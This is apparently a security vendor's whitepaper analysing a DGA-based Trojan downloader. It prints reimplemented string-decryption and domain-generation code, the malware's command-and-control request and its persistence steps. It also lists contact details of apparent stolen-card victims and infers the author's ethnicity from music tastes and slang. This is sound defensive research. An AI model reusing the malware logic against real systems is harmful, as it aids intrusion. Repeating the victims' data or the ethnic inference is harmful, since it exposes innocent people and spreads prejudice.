While novel work has been done by both\nprivate industry and academia with respect to detecting DGA-related network traffic, this whitepaper\ndemonstrates end-to-end analysis of a DGA malware family, from binary deobfuscation to DGA analysis,\nto sinkholing, to domain registrant research, to investigative findings on the malware’s author and his\naccomplices.\n\nOn February 26, 2013, a major American financial services firm received a suspicious email containing a\nfile attachment with subject line, “Hi [redacted] has sent you images.” The firm’s CISO submitted the file\nattachment to CrowdStrike on February 28, 2013 for analysis. CrowdStrike found that the file\nattachment was a heavily obfuscated Trojan downloader, part of a large malware family designed to\ndownload other malware from websites based on a time-seeded domain-generating algorithm.\n\nThe malware family discussed in this whitepaper has thousands of active variants currently running on\nthe Internet and until recently has managed to stay off of the radar of all antivirus firms. This\nwhitepaper brings to light how this malware is tied to an underground campaign that has been active for\nat least the past six years.\n\nIntroduction\n\n\n-----\n\nMost modern malware families communicate with attackers’ remote servers. Trojan downloaders\ndownload additional malware from rogue servers, while bots and remote access tools (RATs)\ncommunicate with command-and-control (C2) servers to execute the attackers’ commands. Malware\nwith this functionality is typically built with a hardcoded attacker-server address or list of server\naddresses controlled by the attacker. While malware building kits have made it easier for malware\nauthors to create hundreds or thousands of variants compiled to use different server addresses, these\nserver addresses can still be discovered by researchers and blacklisted by network engineers without\nmuch effort.\n\nOver the last few years, some malware families have begun to use a different approach to communicate\nwith their remote servers. Instead of using hardcoded server addresses, some malware families now use\na domain generating algorithm (DGA) in order to dynamically determine remote download server\naddress and C2 server addresses at run time.\n\nFor example, consider a DGA where every minute the malware connects to the GMT-time-based server\naddress <month><day><year><hour><minute>.com. Using this example, on July 31, 2013, at 2:30 PM,\nthe malware would connect to 07 _31_ _13_ _14_ _30.com. Every time an attacker wants to communicate with_\ntheir malware, they choose a strike-time and a register the domain corresponding to that strike-time 24\nhours before the time is hit. As the strike-time approaches, the attacker configures their DNS server to\npoint to their rogue server, and perhaps ten minutes after the strike-time, the attacker takes down their\nserver and removes the server’s DNS entry.\n\nUsing a DGA makes it impossible for security researchers to predict the next time malware will receive a\ncommand from an attacker’s server. And given a large enough set of potential DGA-computed domains,\nit also raises the bar for researchers to sinkhole the server addresses.\n\nKraken was one of the first malware families to use a DGA, beginning around April of 2008[1]. Although\nseveral families such as Torpig and Srizbi have also been known to use DGAs, the most famous family to\nuse a DGA is Conficker, discovered in late 2008. Since then, academia and industry have both begun to\nfocus more on DGAs. In 2010, Texas A&M University researchers published a paper on heuristically\ndetecting DGA domain names[2], and in 2012, Damballa released a whitepaper on DGA usage in six new\nmalware families[3].\n\n1 http://blog.threatexpert.com/2008/04/kraken-changes-tactics.html\n2 http://www.cs.ut.ee/~koit/KT/imc104-yadav.pdf\n3 https://www.damballa.com/downloads/r_pubs/WP_DGAs-in-the-Hands-of-Cyber-Criminals.pdf\n\nDomain Generating Algorithms\n\n\n-----\n\nCrowdStrike has detected more than 1,000 variants of the malware described in this whitepaper. The\ntoolkit that created these variants apparently takes a target email address as input and creates as\noutput a malware variant with that email address embedded in it. Most of the malware variants use\nrandomized strings for file names, directory names, and registry names, and also use a randomized\ncryptographic seed value and one-time pad[4] for encrypting and decrypting. The cryptographic seed is set\nat compile time; the one-time pad is recreated by the malware dynamically at run time based on the\ncryptographic seed, as described below.\n\nCrowdStrike has collected over one hundred variants of this malware, several of which contain strings\nthat were not encrypted. Furthermore, instead of using randomized strings as are used in the encrypted\nvariants, the non-encrypted variants use default template strings. Where applicable in this whitepaper,\nwe call out the format of randomized strings used in the encrypted variants and the default template\nstrings used in the non-encrypted variants.\n\n4 http://en.wikipedia.org/wiki/One-time_pad\n\nMalware Overview\n\n\n-----\n\nMost obfuscated malware is obfuscated with a packer. After a malware author compiles their malware,\nthey use a tool called a packer to compress and/or encrypt the malware. The packer also appends an\nunpacking stub to the compressed/encrypted malware which at run time decompresses/decrypts the\npacked code and data and executes the original code. Unpacking stubs also typically feature anti-\ndebugging functionality, though a detailed discussion of packers is outside the scope of this whitepaper.\n\nAlthough the malware described in this whitepaper is obfuscated, it is not packed with a packer. There is\nno appended unpacking stub that restores the code and data to its original form at run-time; instead,\nobfuscated junk code is mixed in with legitimate code. The snippet of disassembly below shows an\nexample where random 32-bit values are assigned to stack variables and used in mathematical\ncalculations. The red X’ed instructions are junk code; the green ✔’ed instructions are legitimate code.\n\nUnfortunately, this inlined obfuscation shows up when using the Hex-Rays decompiler[5] as well:\n\n5 https://www.hex-rays.com/products/decompiler/index.shtml\n\nCode Obfuscation and Deobfuscation\n\n\n-----\n\nHowever, we can manually separate the legitimate code from the junk code. If we assume that all\nfunction arguments (a1, a2, and a3) are legitimate then we can tag all of those arguments, and also tag\nas legitimate all variables that interact with those function arguments. This yields the following tagged\ndecompilation:\n\nIf we now remove all lines of code that don’t contain tagged variables, we have the following:\n\n\n-----\n\nThe code above is now easily analyzable.\n\nHowever, the malware contains over a thousand functions, and manually deobfuscating the code for\neach function would be very time consuming. Instead, we created a Hex-Rays plugin (named\nCrowdDetox) to automate the code deobfuscation process using the following algorithm for a given\nfunction:\n\n1. Find all basic legitimate variables:\n\n           - Function arguments to the current function\n\n           - Global variables\n\n           - Local function variables used as parameters to function calls\n\n           - Local function variables that store return values of function calls\n\n           - Local function variables used in return statements (optional)\n2. Find all non-basic legitimate local function variables\n\n           - Local variables are considered legitimate if their values are read from or written to other\nlegitimate variables\n3. Keep executing Step 2 until no new legitimate local function variables are found\n4. Remove all decompiled instructions that do not involve function calls or legitimate variables\n\n\n-----\n\nBelow is a graph of the original decompilation tree, containing 117 nodes prior to deobfuscation with\nCrowdDetox:\n\nBelow is a graph of the decompilation tree of the same function, containing only 71 nodes after\ndeobfuscation with CrowdDetox:\n\n\n-----\n\nThe CrowdDetox plugin is free and open-source and available at\n[http://www.crowdstrike.com/community-tools](http://www.crowdstrike.com/community-tools)\n\n\n-----\n\nThe malware’s EXE contains no readable static strings related to malicious functionality. There are no\nhuman-readable registry keys, file names, server addresses, or URI paths. This is because all strings are\ndecrypted in memory at run time.\n\nThe cryptographic seed is a DWORD value, statically located at the following location in all variants of\nthe malware:\n\n**32-bit Cryptographic Seed Value**\n**File Offset** **Relative Virtual Address** **Virtual Address**\n```\n           0x00036A24 0x00039024 0x00439024\n\n```\nThe length of the one-time pad is an encrypted DWORD value, statically located at the following location\nin the malware:\n\n**Encrypted 32-bit One-time Pad Length**\n**File Offset** **Relative Virtual Address** **Virtual Address**\n```\n           0x00036A28 0x00039028 0x00439028\n\n```\nIf the seed value and encrypted one-time pad length value are 0x445A4950 and 0x3A59454B,\nrespectively, then the strings in the malware are not encrypted. When parsed as an ASCIIZ string, these\ntwo DWORDs spell “PIZD” and “KEY:”.\n\nThe malware’s strings (either encrypted or not encrypted) begin at the following location in the\nmalware:\n\n**Beginning of Strings**\n**File Offset** **Relative Virtual Address** **Virtual Address**\n```\n           0x00036A30 0x00039030 0x00439030\n\n```\nIf the malware’s strings are not encrypted then the end of the strings “section” is delineated by the\nASCIIZ strings “PIZD” “ENDS”.\n\nIf the malware’s strings are encrypted then the length value of the one-time pad (which is also the\nlength of the strings “section”) is decrypted by XOR’ing the encrypted length value with the value of the\ncryptographic seed. The one-time pad is generated as follows:\n\nData Obfuscation and Deobfuscation\n\n\n-----\n\n```\n       for (i = 0; i < lengthOfOneTimePad; i += 4)\n       {\n         oneTimePad[i + 0] = (seed >> 0x00) & 0xFF;\n         oneTimePad[i + 1] = (seed >> 0x08) & 0xFF;\n         oneTimePad[i + 2] = (seed >> 0x10) & 0xFF;\n         oneTimePad[i + 3] = (seed >> 0x18) & 0xFF;\n         seedRotated = ((seed >> 1) | (seed << (32 - 1)));\n         seed =\n            (seedRotated & 0xFFFF0000) |\n            ((seedRotated + ((seedRotated >> 0x08) & 0xFF)) & 0xFF) << 0x08) |\n            ((2 * seedRotated + ((seedRotated >> 0x08) & 0xFF)) & 0xFF);\n       }\n\n```\nThe malware’s strings can be decrypted as follows:\n```\n       for (i = 0; i < (lengthOfOneTimePad – 0x0C); i++)\n       {\n         beginningOfStrings[i] ^= oneTimePad[0x0C + i];\n       }\n\n```\nDuring run time, the encrypted strings in the “.data” section are never decrypted in place. When the\nmalware needs to use a string, the encrypted string gets copied to the heap, decrypted on the heap,\nused, and then freed.\n\n\n-----\n\nWhen first executed, the malware checks to see if the command line used to run it contains the string\n“WATCHDOGPROC”. If it contains that string and “WATCHDOGPROC” isn’t followed by a file name in\nquotes (\"<file name>\") on the command line, then the process terminates itself. However, if it is\nfollowed by a file name in quotes, then the malware does the following.\n\nCommand Line Contains “\n```\n                   WATCHDOGPROC” and a File Name in Quotes\n\n```\nAs described in detail below, the malware may make a copy of itself in certain situations. This copy’s file\nname, henceforth referred to as <copied file name>, uses the default template string\n“XZSEQWSpulaosugiingat.exe” in non-encrypted variants. In encrypted variants, we’ve seen\n```\n       <copied file name> use the following format: “<7-12 random lowercase\n       letters>.exe”.\n\n```\nAlso described in detail below, the malware uses a synchronization file. This file’s file name, henceforth\nreferred to as <synchronization file name>, is the same as <copied file name> but\nwith a different file extension. The <synchronization file name> file extension used in non-\nencrypted variants is “rng_extXZSEQWS”. In encrypted variants, we’ve seen extensions using the\nfollowing format: “<2-5 random lowercase alphanumeric characters>”.\n\nThe malware continuously checks to see if there are any running processes whose file name is\n“<copied file name>”. If any of these processes are running then the malware sleeps for two\nseconds. Depending on the existence and last-modified time of the file “<synchronization file\n```\n       name>” (in the same directory as the malware), the malware may terminate running processes whose\n\n```\nfile name is “<copied file name>”.\n\nIf the file name in quotes from the command line doesn’t exist or if it does exist but is of a different file\nsize than the malware program’s file size, then the malware removes any special file system attributes\nfrom the file from the command line, copies itself to that file name, and sets its file system attributes to\n“hidden”, after which it runs the file whose name was given in quotes on the command line and then\nterminates its own process.\n\nThis effectively ensures that the program specified on the command line is always running.\n\nMalware’s Base Functionality\n\n\n-----\n\n```\n                           WATCHDOGPROC”\n\n```\nThe malware uses a directory in the user’s “Application Data” directory to store certain files. This\ndirectory’s name, henceforth referred to as <application data directory>, uses the default\ntemplate value “<%userprofile%>\\Local Settings\\Application\n```\n       Data\\NICOLAEGUTAXZSEQWS” in non-encrypted variants. In encrypted variants, we’ve seen\n       <application data directory> use the following format: “<%userprofile%>\\Local\n       Settings\\Application Data\\<7-15 random lowercase letters>”.\n\n```\nThe malware creates the directory “<application data directory>”. If the path to the\nrunning malware process’s executable does not contain the string “<copied file name>”, then the\nmalware copies itself to “<application data directory>\\<copied file name>” and sets\nan auto-start execution point (ASEP) in the registry, after which it sleeps for a second, executes\n“<application data directory>\\<copied file name>”, shows the user a message box,\nand then terminates its own process once the message box is closed by the user.\n\nThe registry value name used by the ASEP, henceforth referred to as <ASEP value name>, uses the\ndefault template string “COSTIIONITAEQWS” in non-encrypted variants. In encrypted variants,\nCrowdStrike has seen <ASEP value name> use the following format: “<4-8 words from\n```\n       existing Windows services’ display names>”. The malware sets registry value “<ASEP\n       value name>” to “<application data directory>\\<copied file name>” in\n\n```\n“HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run”.\n\nWe’ve seen two different message boxes shown amongst the variants. Some variants (both encrypted\nand non-encrypted) show “Your Facebook connection is now secured! Thank you\n```\n       for your support!”, while other variants (both encrypted and non-encrypted) show “This\n       application is not compatible with the version of Windows you're\n       running. Check your computer's system information to see whether you\n       need a x86 (32-bit) or x64 (64-bit) version of the program, and then\n       contact the software publisher.”:\n\n```\nCommand Line Contains Doesn’t Contain “\n\n\n-----\n\nIf the path to the running malware process’s executable does contain the string “<copied file\n```\n       name>”, then the following functionality is executed.\n\n```\nThe malware uses a specific file name for a “watchdog” process. This file name, henceforth referred to\nas <watchdog file name>, uses the default template string\n“XZSEQWSwatch_dog_name.exe” in non-encrypted variants. In encrypted variants, we’ve seen\n```\n       <watchdog file name> use the following format: “<7-12 random lowercase\n       letters>.exe”.\n\n```\nThe malware tries to terminate processes whose file name is “<watchdog file name>” up to ten\ntimes (with a two-second wait in between). It then removes any special file-system attributes from\n“<application data directory>\\<watchdog file name>” (if the file existed), and then\ncopies itself to that location, after which it sets that file copy to be hidden on the file system.\n\nIt then creates “<synchronization file name>” (in the same directory as the malware) and\nwrites the bytes [0x08, 0x07, 0x00, 0x00] to that file.\n\nNext, it executes “<application data directory>\\<watchdog file name>” with the\ncommand-line argument “WATCHDOGPROC \"<malware process’s executable file\n```\n       path>\"”, after which it performs its network functionality.\n\n```\n\n-----\n\nThe malware’s DGA creates a hostname string by concatenating two pseudo-randomly selected strings\nfrom the list below and appending “.net” to the end:\n\n           - `above`           - `expect`           - `prepare`\n\n           - `action`           - `experience`           - `present`\n\n           - `advance`           - `explain`           - `president`\n\n           -

However, the domain-\ngenerating algorithm only uses 15 bits of the seed value, and as such there are only 32,768 possible\nhostnames that can be generated by the malware.\n\nThe seed used by the domain-generating algorithm is the number of seconds that have elapsed since\nJanuary 1, 1970 UTC, divided by 512, thus providing a granularity of 8 minutes and 32 seconds (8 * (60\nseconds/minute) + (32 seconds) = 512 seconds).\n\nHostnames are generated via the following algorithm (C# reinterpretation shown below for simplicity),\nwhere aHexHostname, aHelperTable, and aHostStrings are all hard-coded data arrays in the\nmalware, encrypted in the same manner that strings are encrypted in the malware:\n```\n            string GetHostname(UInt32 seed)\n            {\n             byte[] aShuffle = new byte[15];\n             for (int i = 0; i < 15; i++)\n             {\n              aShuffle[aHelperTable[i * 2]] = (byte)(seed & 1);\n              seed >>= 1;\n             }\n             int iHost1 = 0;\n             int iHost2 = 0;\n             for (int i = 0; i < 7; i++)\n             {\n              iHost1 = 2 * iHost1 | aShuffle[i];\n              iHost2 = 2 * iHost2 | aShuffle[i + 7];\n             }\n             iHost2 = (2 * iHost2 | aShuffle[14]) + 128;\n             UInt16 offsetHost1 = (UInt16)((UInt16)(aHexHostname[iHost1 * 2]) + (UInt16)(((UInt16)(aHexHostname[iHost1 * 2 + 1])) << 0x08));\n             UInt16 offsetHost2 = (UInt16)((UInt16)(aHexHostname[iHost2 * 2]) + (UInt16)(((UInt16)(aHexHostname[iHost2 * 2 + 1])) << 0x08));\n             string host1 = \"\";\n             string host2 = \"\";\n             byte b;\n             while ((b = aHostStrings[offsetHost1++]) != 0)\n             {\n              host1 += (char)b;\n             }\n             while ((b = aHostStrings[offsetHost2++]) != 0)\n             {\n              host2 += (char)b;\n             }\n             return host1 + host2 + \".net\";\n            }\n\n```\nThe malware makes 85 attempts to connect to generated hostnames (via seed+0, seed+1, …\n```\n       seed+84) on TCP port 80 and sends the following request:\n       GET /forum/search.php?email=<email address>&method=post HTTP/1.0\n       Accept: */*\n       Connection: close\n       Host: <hostname>\n\n```\nIn the HTTP request above, the default template string for <email address> is “XZSEQWS” in non-\nencrypted variants; in encrypted variants, it is a unique email address. Based on our research, there\nappears to exist a “generator” malware program that does the following:\n\n\n-----\n\n1. Scrapes email addresses from a user’s computer\n\n2. Generates the malware described in this report, using the scraped email addresses for <email\n```\n          address> (one email address per malware variant)\n\n```\n3. Sends an email to <email address> with the following characteristics:\n\n              - Subject: “Hi <sender’s name> has sent you images.”\n\n              - Sender: “<random lowercase alphanumeric characters>@aol.com”\n(other hostnames are likely also used)\n\n              - Attachment file name: “<local-part[6] of email address>.zip”\n\nThe malware decrypts the HTTP response data, and if certain conditions are met (such as the server’s\nhostname appearing 8 bytes into the HTTP response data), then the malware repeats the request to the\nserver. In the second response, if the HTTP response data ends with [0xA0, 0xBB, 0xBD, 0xA0,\n```\n       0xAC, 0xAA, 0xBC, 0xBC, 0xBA, 0xAC, 0xAC], then the malware writes the bytes\n       [0x08, 0x07, 0x00, 0x00] to “<synchronization file name>” (in the same directory\n\n```\nas the malware) and writes the HTTP response data (not including the last 11 bytes) to\n“<%temp%>\\<downloaded prefix><random alphanumeric string><downloaded\n```\n       postfix>.exe”. \n\n```\nThe default template strings for <downloaded prefix> and <downloaded postfix> are\n“prefixexeXZSEQWS” and “XZSEQWSpostfix”, respectively, in non-encrypted variants; in\nencrypted variants, they are each “<2-5 random lowercase alphanumeric characters>”.\n\nIt then terminates all running processes whose filename is “<watchdog file name>” and executes\n“<%temp%>\\<downloaded prefix><random alphanumeric string><downloaded\n```\n       postfix>.exe” with command-line arguments “UPDATESOX \"<malware’s executable\n       file path>\" <copied file name> <watchdog file name>”.\n\n```\nThe malware then sleeps for about 90 seconds, and if there are no processes running whose filename is\n“<watchdog file name>”, it executes “<application data directory>\\<watchdog\n```\n       file name>” with command-line argument “WATCHDOGPROC \"<malware’s executable\n       file path>\"”.\n\n```\n6 http://en.wikipedia.org/wiki/Email_address#Local_part\n\n\n-----\n\nCrowdStrike sinkholed five domains to which the DGA would resolve, one on each of the following\ndates:\n\n         - March 5, 2013\n\n         - March 6, 2013\n\n         - March 7, 2013\n\n         - March 8, 2013\n\n         - March 9, 2013\n\nOver the five day span, we logged nearly 15,000 hits from infected systems for URI\n/forum/search.php?email=<email address>&method=post\n\n# Sinkhole Activity\n\n## 8000 7000 6000 5000 4000 3000 2000 1000 0\n\nOf these hits, we logged 1,170 unique client IP address and 1,000 unique email addresses that were\nposted to our sinkhole servers.\n\nThe IP addresses were generally based in the United States and Romania:\n\nSinkholing\n\n\n-----\n\n|Country|Unique IP Addresses Logged|\n|---|---|\n|United States|575|\n|Romania|321|\n|Japan|46|\n|Russian Federation|17|\n|Germany|15|\n|France|15|\n|India|14|\n|Netherlands|14|\n|United Kingdom|13|\n|Sweden|11|\n|Ukraine|10|\n|Iran|10|\n|Philippines|10|\n|Viet Nam|10|\n|Canada|8|\n|Czech Republic|5|\n|Sierra Leone|5|\n|Nigeria|4|\n|Hungary|4|\n|Norway|4|\n|Libya|4|\n|Thailand|3|\n|China|3|\n|Switzerland|3|\n|Denmark|2|\n|Ireland|2|\n|Uganda|2|\n|Austria|2|\n|Israel|2|\n|Bangladesh|2|\n|Spain|2|\n|Serbia|2|\n|Kyrgyzstan|2|\n|Taiwan|1|\n|Malta|1|\n|Greece|1|\n|Mongolia|1|\n|Brazil|1|\n|Guam|1|\n|Korea|1|\n\n\n**Country** **Unique IP**\n**Addresses**\n**Logged**\nUnited States 575\nRomania 321\nJapan 46\nRussian Federation 17\nGermany 15\nFrance 15\nIndia 14\nNetherlands 14\nUnited Kingdom 13\nSweden 11\nUkraine 10\nIran 10\nPhilippines 10\nViet Nam 10\nCanada 8\nCzech Republic 5\nSierra Leone 5\nNigeria 4\nHungary 4\nNorway 4\nLibya 4\nThailand 3\nChina 3\nSwitzerland 3\nDenmark 2\nIreland 2\nUganda 2\nAustria 2\nIsrael 2\nBangladesh 2\nSpain 2\nSerbia 2\nKyrgyzstan 2\nTaiwan 1\nMalta 1\nGreece 1\nMongolia 1\nBrazil 1\nGuam 1\nKorea 1\n\n\n-----\n\n|Haiti|1|\n|---|---|\n|Malaysia|1|\n|Northern Mariana Islands|1|\n|Italy|1|\n|Hong Kong|1|\n|Jordan|1|\n|Belarus|1|\n|Tanzania|1|\n|Ecuador|1|\n|Australia|1|\n|Fiji|1|\n|United Arab Emirates|1|\n|Finland|1|\n|Mali|1|\n|Belgium|1|\n|Moldova|1|\n|Slovakia|1|\n\n\nHaiti 1\nMalaysia 1\nNorthern Mariana Islands 1\nItaly 1\nHong Kong 1\nJordan 1\nBelarus 1\nTanzania 1\nEcuador 1\nAustralia 1\nFiji 1\nUnited Arab Emirates 1\nFinland 1\nMali 1\nBelgium 1\nMoldova 1\nSlovakia 1\n\nBased on the email addresses posted (for example, 1800flowers@1800reminders.com,\nbilling@deluxeforbusiness.com, consultant_fiscal-unsubscribe@yahoogroups.com,\nfbmessage+fepvdccz@facebookmail.com, geico_claims@geico.com, and northwest.airlines@nwa.com),\nit appears that another malware component exists that harvests email addresses from infected systems’\ninboxes and creates this malware.\n\nOverall, of the 1,000 email addresses collected, we saw 286 unique email address domains.

Nicolae Guţă[7] is a prominent\n\n```\nRomani[8] manele[9] singer.\n\n         - Non-encrypted variants of the malware make use of the registry value name\n“COSTIIONITAEQWS”. Costi Ioniță[10] is a prominent Romanian manele singer.\n\n         - Non-encrypted variants of the malware make use of the string\n“ADRIANCOPILUMINUNESIFLORINSALAM” for entry point obfuscation. Adrian Copilul\nMinune[11] and Florin Salam[12] are prominent Romani manele singers.\n\n         - Non-encrypted variants of the malware make use of the file name\n“XZSEQWSpulaosugiingat.exe”. The phrase “pula o sug i în gât” loosely translates from\nRomanian to English as “suck a dick in your throat”.\n\nThe artifacts in this malware aren’t typical of most Romanians. Firstly, most Romanians would say\n“pizda” instead of “pizd”, and would say “suge pula în gât” as opposed to “pula o sug i în gât”. The\nuncommon wordings, combined with the author’s apparent interest in Romani manele music, suggest\nthat the author is likely Romani, not Romanian.\n\n7 http://en.wikipedia.org/wiki/Nicolae_Gu%C5%A3%C4%83\n8 http://en.wikipedia.org/wiki/Romani_people\n9 http://en.wikipedia.org/wiki/Manele\n10 http://en.wikipedia.org/wiki/Costi_Ioni%C8%9B%C4%83\n11 https://en.wikipedia.org/wiki/Adrian_Minune\n12 http://en.wikipedia.org/wiki/Florin_Salam\n\nInvestigative Findings onMalware Author\n\n\n-----\n\n|DOMAIN|CREATION DATE|EXPIRY DATE|REGISTRANT|ADMIN EMAIL|ADMIN PHONE|REGISTRAR|\n|---|---|---|---|---|---|---|\n|collegeearly.net|2013-03-05|2014-03-05|Richard III 12991 Henry Rd.

As such, it is\nclear that this malware is actively being used, as more than one new domain is registered per day, on\naverage.\n\nOf the 20 active domains detected via real-time scanning, 19 were registered via and hosted by Yahoo!\nInc.’s Small Business hosting plan[14,15] with registrants using @yahoo.com email accounts, and one was\nregistered via and hosted by Omnis Network LLC[16] with the registrant using an @aol.com email account.\n\nAs can be seen below, several registrant names and addresses are reused (highlighted), and based on\nopen-source research, these appear to be real people who live at the addresses given. Based on that\nevidence, plus the fact that there are different phone numbers and email addresses for each registrant\nof the same name, we believe that these domains were purchased using stolen credit cards that belong\nto these individuals.\n\n**CREATION** **EXPIRY**\n**DOMAIN** **REGISTRANT** **ADMIN EMAIL** **ADMIN PHONE** **REGISTRAR**\n\n**DATE** **DATE**\n\ncollegeearly.net 2013-03-05 2014-03-05 Richard III rgilleyiii@yahoo.com +1.2708463527 MELBOURNE IT, LTD.\n12991 Henry Rd.

Nonetheless, the extended campaign history appears to be as follows:\n\n                     - March 2013 Trust Core\n\n                     - March 2013 Mojo Directo\n\n                     - **February 2013** **GlobalPartners**\n\n                     - January 2013 Anatara Group\n\n                     - September 2012 Ahai Group\n\n                     - July 2011 Azure Holding Group\n\n                     - April 2011 KPL\n\n                     - November 2009 Logicom\n\n                     - May 2009 RBS Partners\n\n                     - February 2009 FastWire Group\n\n                     - December 2008 INTRACOM\n\n                     - November 2008 MTK\n\n                     - June 2008 ITP\n\n                     - January 2008 International Wire\n\n                     - September 2007 INT Group\n\n                     - May 2007 Interpay Group\n\n\n-----\n\nCrowdStrike initially collected 16 “template” variants and 132 non-“template” variants of this malware\nfamily. The PE timestamps on all 148 samples appear to be legitimate, given that they correspond with\nthe dates the samples were first seen in the wild.\n\nBelow is a visualization of the variants’ PE timestamps, bucketed by hour. For example, there were 15\nnon-“template” variants with PE timestamps of 2/2/13 in the range 21:00 through 21:59, UTC.\n\nPE Timestamp, Bucketed by Hour (UTC)\n\nAs can be seen above, this malware first built in February of 2013. The first variant seen on VirusTotal[32]\nwas seen on February 6[th], 2013.\n\nOur analysis of this malware (the primary content of this whitepaper) was conducted in February of\n2013. Avast discovered a variant of this malware in June of 2013[33].\n\n32 http://www.virustotal.com/\n33 https://blog.avast.com/2013/06/18/your-facebook-connection-is-now-secured/ 0510152025303540452/2/13,21:002/2/13,22:00…2/5/13,18:002/5/13,19:002/5/13,20:00\"Template\" VariantsNon-\"Template\" VariantsNumber of VariantsVariants Grouped by PE Timestamp\n\nAntivirus Detections\n\n\n-----\n\nAs this malware family is tied to a campaign that dates back to at least 2007, CrowdStrike was interested\nto see how many antivirus vendors identified these samples as part of a unique malware family, as\nopposed to a set of “generic” malware.\n\n**Detection Rate** **Antivirus Engine** **Most Common Detection Name**\n100.0% Malwarebytes Trojan.Agent\n99.3% ESET Win32/Agent\n98.6% AVG Generic_r\n98.6% Kaspersky Trojan.Win32.Generic\n98.0% Panda Trj/Genetic\n98.0% Sophos Troj/Agent\n95.2% G Data Gen:Variant.Zusy\n93.2% Bitdefender Gen:Variant.Zusy\n91.8% F-Secure Gen:Variant.Zusy\n88.4% Fortinet W32/Agent\n81.0% Norman Malware\n76.9% GFI VIPRE Trojan.Win32.Agent\n75.5% Avast Win32:Agent\n38.1% McAfee Artemis\n21.8% Trend Micro TROJ_GEN\n17.7% Symantec WS.Reputation.1\n15.0% Microsoft Win32/Suppobox\n0% ClamAV\n\nAs can be seen above, most antivirus vendors assign generic names (“Agent”, “Generic”, “Genetic”, etc.)\nto the variants of this malware that they detect. CrowdStrike was not able to find online documentation\non “Zusy” from G Data, BitDefender, or F-Secure. “Artemis” is a generic detection from McAfee[34].\n“WS.Reputation.1” is a generic detection from Symantec[35].\n\nDespite the fact that Microsoft had low detection rates for this malware, they are the only AV vendor\nthat detected these variants as part of a unique family: “Suppobox”. Not only was “Suppobox” the most\ncommon detection name given by Microsoft to these samples, it was the only detection name used to\ndetect these samples, giving strong confirmation that Microsoft recognized the samples as part of a\nnovel family. Microsoft added detection for this family on April 6, 2013[36] (two months after the malware\nbegan circulating).\n\n34 http://service.mcafee.com/faqdocument.aspx?id=TS100414\n35 http://www.symantec.com/security_response/writeup.jsp?docid=2010-051308-1854-99\n36\n\nhttp://www.microsoft.com/security/portal/threat/encyclopedia/Entry.aspx?Name=Trojan%3AWin32%2FSuppobo\nx.A\n\n\n-----\n\nAside from Microsoft’s detection in April of 2013 and Avast’s blog post in June of 2013, the novelty of\nthis malware family has effectively slipped under the radar of most antivirus vendors.\n\n\n-----\n\nBased on the binary analysis of the sample submitted to us and the analysis of variants of the sample\nthat CrowdStrike acquired, it appears that the author of the malware is Romani. This Romani malware\nauthor appears to be working in conjunction with a long-running European money-mule campaign,\nprevious instances of which date back to at least 2007.\n\nIt is also evident that the malware analyzed in this whitepaper is one component of a larger set of\nmalicious functionality. Another component apparently harvests email addresses from infected\ncomputers, builds the malware analyzed in this whitepaper, and emails that malware to target\nrecipients.\n\nThe DGA domains used by the attackers in this campaign appear to be registered with stolen credit card\nnumbers.\n\nWe will continue to research this campaign in an effort to more narrowly identify the malware author\nand his money-mule accomplices.\n\nConclusion\n\n\n-----\n\n-----",
